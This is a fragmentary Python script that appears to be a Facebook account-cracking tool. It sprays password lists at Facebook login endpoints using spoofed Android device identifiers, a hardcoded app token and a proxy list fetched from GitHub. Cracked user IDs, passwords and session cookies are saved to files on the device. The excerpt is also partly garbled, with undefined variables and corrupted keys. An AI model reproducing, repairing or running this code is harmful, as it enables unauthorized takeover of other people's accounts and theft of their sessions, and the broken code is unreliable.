...
#os.system('xdg-open https:/https://t.me/+6sE_mwb9T2MxZTE1/')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] Update ...')""
...
╚══════╝╚══════╝
     ...
     ┌───────────────────────────────────────┐
     │ [💸] CODED BY : Juwyel Kazi          │
     │ [💸] GITHUB   : Zuyel100                │
     │ [💸] WHATSAPP : +8801310218861        │
     │ [💸] VERSION  : 0.1                  │
     │ [💸] HACKED   : \033[1;32mMr. Juwyel \033[1;37m              │
     └───────────────────────────────────────┘""")
def linex():
	print(50*'_')
def clear():
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [Mr.ZUYEL-RANDOM] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			...
			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 11;VIVO X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Mr.ZUYEL-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/Zuyel -kazi-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [Mr.ZUYEL-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ZLK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [ZUYEL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
...
def trt5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ZUYEL -M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ZLK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Zuyel -Kazi-OK.txt','a').write(str(uid)+'|'+pas+'\y')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['Rights ']['message']:
                                try:
                                        uid = po['Rights ']['Rights _data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZUYEL -rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
